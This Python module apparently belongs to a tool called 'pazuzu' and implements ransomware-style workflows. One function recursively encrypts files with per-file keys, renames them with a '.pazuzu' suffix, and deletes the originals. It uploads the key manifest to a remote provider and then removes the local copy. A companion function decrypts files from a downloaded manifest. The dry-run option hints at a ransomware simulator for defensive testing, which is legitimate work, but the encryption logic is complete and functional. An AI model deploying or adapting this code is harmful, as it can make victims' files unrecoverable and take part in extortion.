"""Core encryption and decryption workflows."""

from __future__ import annotations

import os
from datetime import datetime, timezone
from fnmatch import fnmatch
from logging import LoggerAdapter
from pathlib import Path
from typing import Iterable

from .config import AppConfig
from .crypto import decrypt_data, encrypt_data, generate_key
from .manifest import Manifest
from .providers import ManifestProvider


def _iter_target_files(config: AppConfig) -> Iterable[Path]:
    start_path = config.start_dir
    include_patterns = config.include_globs
    exclude_patterns = config.exclude_globs

    for root, _, files in os.walk(start_path):
        root_path = Path(root)
        for filename in files:
            file_path = root_path / filename
            try:
                rel_path = file_path.relative_to(start_path)
            except ValueError:
                continue
            rel_str = str(rel_path.as_posix())
            if not any(fnmatch(rel_str, pattern) for pattern in include_patterns):
                continue
            if any(fnmatch(rel_str, pattern) for pattern in exclude_patterns):
                continue
            yield file_path


def encrypt_directory(
    config: AppConfig,
    provider: ManifestProvider,
    logger: LoggerAdapter,
) -> str | None:
    start_path = config.start_dir
    manifest_dir = config.manifest_dir
    manifest_dir.mkdir(parents=True, exist_ok=True)
    manifest_filename = f"pazuzu-manifest-{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}.csv"
    manifest_path = manifest_dir / manifest_filename
    manifest = Manifest(manifest_path)

    files_processed = 0

    for file_path in _iter_target_files(config):
        files_processed += 1
        logger.info(
            "Processing file",
            extra={"action": "encrypt", "file_path": str(file_path), "provider": config.provider.name},
        )
        if config.dry_run:
            continue
        try:
            key = generate_key()
            with file_path.open("rb") as src:
                data = src.read()
            encrypted = encrypt_data(data, key)
            encrypted_path = file_path.with_suffix(file_path.suffix + ".pazuzu")
            with encrypted_path.open("wb") as dst:
                dst.write(encrypted)
            file_path.unlink()
            manifest.add_entry(str(encrypted_path), key)
        except (OSError, PermissionError) as err:
            logger.warning(
                f"Failed to encrypt file: {err}",
                extra={"action": "encrypt", "file_path": str(file_path), "provider": config.provider.name},
            )

    logger.info(
        "Encryption complete",
        extra={"action": "encrypt", "file_path": str(start_path), "provider": config.provider.name},
    )

    if config.dry_run:
        logger.info("Dry run enabled; manifest not created", extra={"action": "dry_run"})
        return None

    manifest.write()
    manifest_id, manifest_url = provider.upload_manifest(manifest_path)
    logger.info(
        "Manifest uploaded",
        extra={
            "action": "upload_manifest",
            "file_path": str(manifest_path),
            "provider": config.provider.name,
            "manifest_id": manifest_id,
            "manifest_url": manifest_url,
        },
    )
    manifest_path.unlink(missing_ok=True)
    logger.info(
        "Manifest removed after upload",
        extra={"action": "cleanup", "file_path": str(manifest_path), "provider": config.provider.name},
    )

    return manifest_id


def decrypt_from_manifest(
    config: AppConfig,
    provider: ManifestProvider,
    logger: LoggerAdapter,
    manifest_id: str | None = None,
) -> None:
    manifest_id = manifest_id or config.manifest_id
    if not manifest_id:
        raise ValueError("Manifest ID must be provided via CLI, config file, or env")

    logger.info(
        "Downloading manifest",
        extra={"action": "download_manifest", "manifest_id": manifest_id, "provider": config.provider.name},
    )

    manifest_content = provider.download_manifest(manifest_id)
    manifest = Manifest.from_content(manifest_content)

    for entry in manifest:
        encrypted_path = Path(entry.file_path)
        logger.info(
            "Processing encrypted file",
            extra={"action": "decrypt", "file_path": str(encrypted_path), "provider": config.provider.name},
        )
        if config.dry_run:
            continue
        if not encrypted_path.exists():
            logger.warning(
                "Encrypted file not found",
                extra={"action": "decrypt", "file_path": str(encrypted_path), "provider": config.provider.name},
            )
            continue
        try:
            with encrypted_path.open("rb") as src:
                encrypted_data = src.read()
            decrypted_data = decrypt_data(encrypted_data, entry.encryption_key)
            original_path_str = entry.file_path
            if original_path_str.endswith(".pazuzu"):
                original_path_str = original_path_str[:-8]
            original_path = Path(original_path_str)
            with original_path.open("wb") as dst:
                dst.write(decrypted_data)
            encrypted_path.unlink()
        except (OSError, PermissionError) as err:
            logger.warning(
                f"Failed to decrypt file: {err}",
                extra={"action": "decrypt", "file_path": str(encrypted_path), "provider": config.provider.name},
            )

    logger.info(
        "Decryption complete",
        extra={"action": "decrypt", "file_path": str(config.start_dir), "provider": config.provider.name},
    )

